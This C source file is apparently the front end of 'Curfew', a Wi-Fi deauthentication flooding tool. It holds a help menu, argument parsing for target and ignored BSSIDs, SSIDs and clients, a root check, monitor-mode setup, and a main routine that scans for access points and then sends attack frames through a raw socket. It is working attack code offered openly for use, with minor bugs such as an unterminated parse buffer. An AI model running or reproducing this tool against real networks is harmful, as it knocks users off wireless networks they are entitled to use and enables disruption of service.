	printf("AUTHOR:     Ravjot Singh Samra (ravss@live.com)\n");\
	printf("LICENSE:    MIT, free software, 2017 - %s\n", __DATE__ + 7);\
	\
	printf("PARAMETERS:\n");\
	printf("  ARGUMENT | EXAMPLE | DEFAULT\n "\
		"\t\tEXPLANATION\n\n");\
	\
	printf("\t-d | curfew -d wlan0 | Required\n");\
	printf("\t\tSpecify the wireless interface/device.\n"\
		"\t\tMust support cfg80211/mac80211.\n\n");\
	\
	printf("\t-s | curfew -s 1 | 3\n");\
	printf("\t\tSpecify how many scans for access points to perform.\n"\
		"\t\tMore than 1 is recommended so all are found.\n\n");\
	\
	printf("\t-b | curfew -b 32 | 8\n");\
	printf("\t\tSpecify how many deauthentication frames\n"\
		"\t\tto flood during an attack on an access point\n"\
		"\t\tbefore rotating to the next one.\n\n");\
	\
	printf("\t-x | curfew -x | Unactivated\n");\
	printf("\t\tPassing this argument stops all attacks\n"\
		"\t\tand only lets the program scan; thus, a ceasefire.\n\n");\
	\
	printf("\t-N | curfew -N | Unactivated\n");\
	printf("\t\tSpecifies that the program should use the new Netlink\n"\
		"\t\tmethod of configuring the device, as opposed to IOCTL.\n"\
		"\t\tThis can cause many issues and depends on\n"\
		"\t\tthe device's driver implementations.\n"\
		"\t\tNote that Netlink is still required "\
		"for scanning anyway.\n\n");\
	\
	printf("\t-i | curfew -i 52:41:56:4a:4f:54 | Unspecified\n");\
	printf("\t\tSpecifies which BSSID to ignore during the attack.\n\n");\
	\
	printf("\t-a | curfew -i 00:53:49:4e:47:48 | Unspecified\n");\
	printf("\t\tSpecifies the only BSSID to attack and "\
		"ignore all others.\n\n");\
	\
	printf("\t-I | curfew -I MyAccessPoint | Unspecified\n");\
	printf("\t\tSpecifies which SSID to ignore during the attack.\n\n");\
	\
	printf("\t-A | curfew -A MyAccessPoint2 | Unspecified\n");\
	printf("\t\tSpecifies the only BSSID to attack and "\
		"ignore all others.\n\n");\
	\
	printf("\t-c | curfew -c 00:53:41:4d:52:41 | FF:FF:FF:FF:FF:FF\n");\
	printf("\t\tSpecify the only client to attack and "\
		"ignore all others.\n\n");\
	\
	printf("\t-r | curfew -r 0x04 | Argument currently does nothing\n");\
	printf("\t\tSpecify the deauthentication reason code to be sent.\n\n");\
	\
	printf("\t-v | curfew -v | Unspecified\n");\
	printf("\t\tIncrease more verbosity, mostly of Netlink sockets.\n\n");\
	\
	printf("\t-h | curfew -h | Specified if no arguments present\n");\
	printf("\t\tDisplays this help menu.\n\n");\
} while (0)

int parseArgBSSID(unsigned char *storage, char *arg)
{
	int i, a;
	char concatenated[2 + 1];
	char **invalid;

	invalid = malloc(sizeof(invalid));
	invalid[0] = '\0';
	a = 0;

	/* Turns two characters representing an octet into an actual octet. */
	for (i = 0; i < 6; ++i)
	{
		concatenated[0] = arg[a];
		concatenated[1] = arg[a + 1];
		storage[i] = strtoul(concatenated, invalid, 16);
		a += 3; /* Skips the ':'. */

		if (*invalid[0] != '\0')
		{
			fprintf(stderr, "ERROR: '%s' in '%s' is not valid "
				"base-16.\n", *invalid, arg);
			free(invalid);
			return 0;
		}
	}

	free(invalid);
	return 1;
}

/* TODO: Let the user specify multiple SSIDs or BSSIDs, along with making
/  this entire function more verbose for confirmation's sake. */
int argumentParser(struct SCAN *currentRun, int argi)
{
	if (argi == 'd')
	{
		strncpy(currentRun->currentArgs->device, optarg, 15);
		return 1;
	}
	else if (argi == 'b')
	{
		currentRun->currentArgs->burstRate = strtoul(optarg, NULL, 10);

		if (!currentRun->currentArgs->burstRate)
		{
			fprintf(stderr, "CRITICAL ERROR: Burst rate is "
				"invalid '%s'.\n", optarg);
			return 0;
		}
		else
		{
			printf("SUCCESS: Burst rate is set to %d.\n",
				currentRun->currentArgs->burstRate);
			return 1;
		}
	}
	else if (argi == 'x')
	{
		currentRun->currentArgs->ceasefire = 1;
		printf("SUCCESS: This run will only scan and not attack.\n");
		return 1;
	}
	else if (argi == 'N')
	{
		currentRun->currentArgs->depreciatedMethods = 0;
		return 1;
	}
	else if (argi == 'i')
	{
		if (!parseArgBSSID(currentRun->currentArgs->ignoreBssid,
			optarg))
			return 0;
		else printBSSID("SUCCESS: Ignoring ",
			currentRun->currentArgs->ignoreBssid,
			" during attack.\n");
		return 1;
	}
	else if (argi == 'a')
	{
		if (!parseArgBSSID(currentRun->currentArgs->attackBssid,
			optarg))
			return 0;
		else printBSSID("SUCCESS: Targeting only ",
			currentRun->currentArgs->attackBssid,
			" during attack.\n");
		return 1;
	}
	else if (argi == 'I')
	{
		strncpy(currentRun->currentArgs->ignoreSsid, optarg, 32);
		printf("SUCCESS: Ignoring %s during attack.\n",
			currentRun->currentArgs->ignoreSsid);
		return 1;
	}
	else if (argi == 'A')
	{
		strncpy(currentRun->currentArgs->attackSsid, optarg, 32);
		printf("SUCCESS: Targeting only %s during attack.\n",
			currentRun->currentArgs->attackSsid);
		return 1;
	}
	else if (argi == 'r')
	{
		/* TODO: Fix this by fixing the frame builder. */
		fprintf(stderr, "ERROR: '-r' currently does nothing. "
			"Continuing regardless.\n");
		strncpy(currentRun->currentArgs->deauthReason, optarg, 32);
		return 1;
	}
	else if (argi == 'v')
	{
		verbose = 1;
		return 1;
	}
	else if (argi == 'c')
	{
		if (!parseArgBSSID(currentRun->currentArgs->attackClient,
			optarg))
			return 0;
		else printBSSID("SUCCESS: Deauthenticating only client ",
			currentRun->currentArgs->attackClient,
			" during attack.\n");
		return 1;
	}
	else if (argi == 's')
	{
		currentRun->currentArgs->scans = strtoul(optarg, NULL, 10);

		if (!currentRun->currentArgs->scans)
		{
			fprintf(stderr, "CRITICAL ERROR: Scan number is "
				"invalid '%s'.\n", optarg);
			return 0;
		}
		else
		{
			printf("SUCCESS: Scan attempts is set to %d.\n",
				currentRun->currentArgs->scans);
			return 1;
		}
	}
	else return 0;
}

int main(int argc, char *argv[])
{
	int i;
	unsigned int rawSocket;
	struct SCAN *currentRun;

	if (argc == 1)
	{
		helpMenu;
		return EXIT_FAILURE;
	}

	for (i = 0; i < argc; ++i)
	{
		if (!strncmp("-h", argv[i], 3)
			|| !strncmp("--help", argv[i], 7))
		{
			helpMenu;
			return EXIT_FAILURE;
		}
	}

	if (geteuid() != 0)
	{
		fprintf(stderr, "CRITICAL ERROR: This program requires "
			"root privileges.\n");
		return EXIT_FAILURE;
	}
	else printf("BEGIN: Curfew is now setting up.\n");

	currentRun = malloc(sizeof(struct SCAN));
	manageScanMemory(currentRun, 1);

	/* The default settings. */
	currentRun->currentArgs->burstRate = 8;
	currentRun->currentArgs->depreciatedMethods = 1;
	currentRun->currentArgs->ceasefire = 0;
	currentRun->currentArgs->scans = 3;

	while ((i = getopt(argc, argv, "d:b:xNi:a:I:A:r:vc:s:")) != -1)
	{
		if (!argumentParser(currentRun, i))
		{
			fprintf(stderr, "CRITICAL ERROR: An argument was not "
				"parsed correctly.\n");
			manageScanMemory(currentRun, 0);
			return EXIT_FAILURE;
		}
	}

	if (currentRun->currentArgs->device[0] == '\0')
	{
		fprintf(stderr, "CRITICAL ERROR: A device/interface is "
			"required via '-d'.\n");
		manageScanMemory(currentRun, 0);
		return EXIT_FAILURE;
	}

	if (!if_nametoindex(currentRun->currentArgs->device))
	{
		fprintf(stderr, "CRITICAL ERROR: No interface was found for "
			"'%s'.\n", currentRun->currentArgs->device);
		manageScanMemory(currentRun, 0);
		return EXIT_FAILURE;
	}

	signal(SIGINT, exitHandler);

	/* The Netlink scan only works if the device is not in monitor mode. */
	if (!currentRun->currentArgs->depreciatedMethods)
		setMonitor(currentRun->currentArgs->device, 0);
	else depreciated_setMonitor(currentRun->currentArgs->device, 0);

	for (i = 0; i < currentRun->currentArgs->scans; ++i)
	{
		printf("SUCCESS: Scan %d has begun.\n", i + 1);

		if (triggerScan(currentRun->currentArgs) != 0)
		{
			fprintf(stderr, "CRITICAL ERROR: The scan was "
				"not successful.\n");
			return EXIT_FAILURE;
		}

		getScan(currentRun);
	}

	if (currentRun->found)
		printf("INFO: Access points found: %hu.\n", currentRun->found);
	else
	{
		fprintf(stderr, "INFO: No access points were "
			"found. There is nothing to attack.\n");
		goto cleanup;
	}

	if (exiting || currentRun->currentArgs->ceasefire)
		goto cleanup;
	else printf("INFO: Curfew has now started...\n");

	/* I don't think monitor mode is required for injection, but again,
	/  I believe it entirely depends on how the vendor has implemented
	/  the interface, so just to be sure I'll do it anyway. */
	if (!currentRun->currentArgs->depreciatedMethods)
	{
		monitorInterface(currentRun->currentArgs->device, MONITOR, 1);
		rawSocket = createRawSocket(MONITOR);
		sendAttackFrames(currentRun, rawSocket);
		monitorInterface(currentRun->currentArgs->device, MONITOR, 0);
	}
	else
	{
		depreciated_setMonitor(currentRun->currentArgs->device, 1);
		rawSocket = createRawSocket(currentRun->currentArgs->device);
		sendAttackFrames(currentRun, rawSocket);
		depreciated_setMonitor(currentRun->currentArgs->device, 0);
	}


	close(rawSocket);

	cleanup: manageScanMemory(currentRun, 0);
	printf("END: Curfew has ended successfully.\n");

	return EXIT_SUCCESS;
}
